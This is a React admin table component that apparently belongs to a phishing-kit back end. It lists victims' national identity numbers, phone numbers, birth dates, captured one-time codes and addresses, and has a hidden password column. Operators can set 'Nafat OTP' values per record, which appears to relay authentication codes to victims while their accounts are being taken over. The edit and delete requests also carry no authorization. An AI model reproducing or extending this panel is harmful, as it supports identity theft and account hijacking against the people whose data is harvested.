import { useEffect, useState } from "react";
import dynamic from "next/dynamic";
import toast from "react-hot-toast";
import { useRouter } from "next/navigation";
import { Pagination } from "@nextui-org/react";

const UserDetailsTable = ({ token }) => {
  const [orders, setOrders] = useState([]);
  const [loading, setLoading] = useState(false);
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);

  const router = useRouter();

  // console.log("orders", orders);

  useEffect(() => {
    const fetchOrders = () => {
      // setLoading(true);
      fetch(`${process.env.API_URL}/api/admin/orders?page=${page}&limit=10`, {
        method: "GET",
        headers: {
          authorization: `Bearer ${token}`, // Authorization header
        },
      })
        .then(async (res) => {
          if (!res.ok) {
            throw new Error(`HTTP error! status: ${res.status}`);
          }

          const data = await res.json(); // Parse the response

          if (data.message) {
            toast.error(data.message);
            router.push("/admin-login");
          } else {
            setOrders(data.orders);
            setTotalPages(data.totalPages);
            setLoading(false); // Only for the first fetch
          }
        })
        .catch((err) => {
          console.log("Error fetching orders:", err);
          setLoading(false); // Ensure loading is stopped on error
        });
    };

    // Fetch the orders initially
    fetchOrders();

    // Set up polling every 5 seconds (5000 ms)
    const interval = setInterval(() => {
      fetchOrders();
    }, 10000); // Adjust interval (e.g., 5000ms = 5 seconds or 10000ms = 10 seconds)

    // Clean up interval on unmount
    return () => clearInterval(interval);
  }, [token, router, page]);

  useEffect(() => {
    if (page) {
      setLoading(true);
    }
  }, [page]);

  const handleNextPage = () => {
    if (page < totalPages) setPage(page + 1);
  };

  const handlePrevPage = () => {
    if (page > 1) setPage(page - 1);
  };

  const handlePageClick = (pageNum) => {
    setPage(pageNum);
  };

  const renderPageNumbers = () => {
    let pageNumbers = [];

    // Show 3 pages after current page
    for (let i = page + 1; i <= Math.min(page + 3, totalPages); i++) {
      pageNumbers.push(
        <button
          key={i}
          onClick={() => handlePageClick(i)}
          className={`px-4 py-2 mx-1 ${
            page === i ? "bg-blue-500 text-white" : "bg-gray-200 text-gray-700"
          } rounded`}
        >
          {i}
        </button>
      );
    }

    // If the current page is not close to the end, show ellipsis and last pages
    if (page + 4 < totalPages) {
      pageNumbers.push(
        <span key="ellipsis" className="px-4 py-2 mx-1">
          ...
        </span>
      );
      for (let i = totalPages - 2; i <= totalPages; i++) {
        if (i > page + 3) {
          pageNumbers.push(
            <button
              key={i}
              onClick={() => handlePageClick(i)}
              className={`px-4 py-2 mx-1 ${
                page === i
                  ? "bg-blue-500 text-white"
                  : "bg-gray-200 text-gray-700"
              } rounded`}
            >
              {i}
            </button>
          );
        }
      }
    }

    return pageNumbers;
  };

  const handleUpdateSubmit = (index, event) => {
    event.preventDefault();
    const submitData = {
      nafatOtp: Number(event.target.nafatOtp.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.nafatOtp === 0) {
      toast.error("Please enter your nafat otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Nafat OTP updated successfully");
            window.location.reload();
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          // alert(`Something went wrong ~${err}`)
          console.log("err", err);
        });
    }
  };

  const handleUpdateNafatOneSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      nafatOtpOne: Number(event.target.nafatOtpOne.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.nafatOtpOne === 0) {
      toast.error("Please enter your nafat otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Nafat OTP updated successfully");
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };

  const handleUpdateNafatTwoSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      nafatOtpTwo: Number(event.target.nafatOtpTwo.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.nafatOtpTwo === 0) {
      toast.error("Please enter your nafat otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Nafat OTP updated successfully");
            // window.location.reload();
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };
  const handleUpdateOrderConfirmationSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      orderConfirmationOtp: Number(event.target.orderConfirmationOtp.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.orderConfirmationOtp === 0) {
      toast.error("Please enter your order confirmation otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Order confirmation OTP updated successfully");
            // window.location.reload();
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };

  const handleUpdateNafatThreeSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      nafatOtpThree: Number(event.target.nafatOtpThree.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.nafatOtpThree === 0) {
      toast.error("Please enter your nafat otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Nafat OTP updated successfully");
            // window.location.reload();
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };

  const handleUpdateNafatOne = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) => handleUpdateNafatOneSubmit(index, event)}
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="nafatOtpOne"
            placeholder={orders[index].nafatOtpOne}
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    );
  };

  const handleUpdateNafatTwo = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) => handleUpdateNafatTwoSubmit(index, event)}
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="nafatOtpTwo"
            placeholder={orders[index].nafatOtpTwo}
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    );
  };
  const handleUpdateOrderConfirmationOtp = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) =>
            handleUpdateOrderConfirmationSubmit(index, event)
          }
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="orderConfirmationOtp"
            placeholder={orders[index].orderConfirmationOtp}
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    );
  };

  const handleUpdateNafatThree = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) => handleUpdateNafatThreeSubmit(index, event)}
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="nafatOtpThree"
            placeholder={orders[index].nafatOtpThree}
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    );
  };

  const handleDelete = (id) => {
    // delete the data from api localhost:3000/api/admin/orders/[id]
    fetch(`${process.env.API_URL}/api/admin/orders/${id}`, {
      method: "DELETE",
    })
      .then((res) => res.json())
      .then((data) => {
        if (data) {
          // reload the page on alert click
          toast.success("User deleted successfully");
          window.location.reload();
        } else {
          toast.error("Something went wrong");
        }
      })
      .catch((err) => {
        toast.error(`Something went wrong ~${err}`);
      });
  };

  const dateFormat = (date) => {
    const newDate = new Date(date);
    const day = newDate.getDate();
    const month = newDate.getMonth() + 1;
    const year = newDate.getFullYear();
    return `${day}-${month}-${year}`;
  };

  const handleOrders = () => {
    if (loading) {
      return (
        <tr>
          <td className="py-10 md:py-20" colSpan={13}>
            <div className="flex justify-center items-center">
              <div className="animate-spin rounded-full h-20 w-20 border-t-2 border-b-2 border-teal-500"></div>
            </div>
          </td>
        </tr>
      );
    } else if (orders.length === 0) {
      return (
        <tr>
          <td className="px-6 py-4" colSpan={13}>
            <div className="flex justify-center items-center">
              <p className="text-lg text-gray-500 dark:text-gray-400">
                No Data Found
              </p>
            </div>
          </td>
        </tr>
      );
    } else {
      return orders?.map((order, index) => (
        <tr key={index}>
          <td className="px-6 py-4">{index + 1}</td>
          <td className="px-6 py-4">{order.identity}</td>
          <td className="px-6 py-4">{order.phone}</td>
          {/* <td className="px-6 py-4">{order.password}</td> */}
          <td className="px-6 py-4">{dateFormat(order.dob)}</td>
          <td className="px-6 py-4">{order.firstOtp}</td>
          <td className="px-6 py-4">{handleUpdateNafatOne(index)}</td>
          <td className="px-6 py-4">{handleUpdateNafatTwo(index)}</td>
          <td className="px-6 py-4">{order.orderConfirmationOtp}</td>
          <td className="px-6 py-4">{handleUpdateNafatThree(index)}</td>
          <td className="px-6 py-4">{order?.profession}</td>
          <td className="px-6 py-4">{order.nationality}</td>
          <td className="px-6 py-4 min-w-[200px]">
            Birth Place: {order.birthPlace}
            <br />
            City: {order.city}
            <br />
            Details: {order.details}
          </td>
          <td className="px-6 py-4">
            <button
              className="px-4 py-1 text-white bg-red-500 rounded-md"
              onClick={() => handleDelete(order._id)}
            >
              Delete
            </button>
          </td>
        </tr>
      ));
    }
  };

  return (
    <div>
      <div className="relative overflow-x-auto overflow-y-hidden border mb-10">
        <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
          <thead className="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 border-b">
            <tr>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                #ID
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Username
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Phone
              </th>
              {/* <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Password
              </th> */}
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                DOB
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                First OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nafat OTP One
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nafat OTP Two
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Order Confirmation OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nafat OTP Three
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Profession
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Country
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Address Details
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Action
              </th>
            </tr>
          </thead>
          <tbody>
            {/* If order length is zero show message */}
            {handleOrders()}
          </tbody>
        </table>
        <div className="flex items-center gap-2 justify-center">
          {/* <button
            onClick={handlePrevPage}
            disabled={page === 1}
            className="px-4 py-2 bg-gray-200 rounded disabled:bg-gray-300"
          >
            Previous
          </button> */}

          {/* <span className="px-4 py-2">
            Page {page} of {totalPages}
          </span> */}

          {/* <div>{renderPageNumbers()}</div> */}

          <Pagination
            showControls
            total={totalPages}
            initialPage={1}
            page={page}
            onChange={setPage}
          />

          {/* <button
            onClick={handleNextPage}
            disabled={page === totalPages}
            className="px-4 py-2 bg-gray-200 rounded disabled:bg-gray-300"
          >
            Next
          </button> */}
        </div>
      </div>
    </div>
  );
};

export default dynamic(() => Promise.resolve(UserDetailsTable), { ssr: false });
